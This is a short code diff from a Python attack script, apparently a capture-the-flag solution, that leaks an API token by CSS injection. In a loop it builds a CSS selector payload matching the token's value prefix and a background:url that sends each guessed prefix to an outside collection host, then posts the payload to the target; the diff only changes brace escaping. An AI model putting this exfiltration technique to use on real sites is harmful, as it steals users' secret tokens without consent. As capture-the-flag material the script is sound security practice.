@@ -88,7 +88,7 @@ def attack():
 	
 		prefix = flag + chr(i)
 		print("sending..."+prefix)
-		payload = "mypage?color=green; }} input[id=InputApitoken][value^=\{0\}] {{ background:url(http://ctf.heogi.com:5000/?c=\{0\})".format(prefix)
+		payload = "mypage?color=green; }} input[id=InputApitoken][value^=\{0\}] \{\{ background:url(http://ctf.heogi.com:5000/?c=\{0\})".format(prefix)
 		data = {"path" : payload}
 		requests.post(url, headers=headers, data=data)
 	
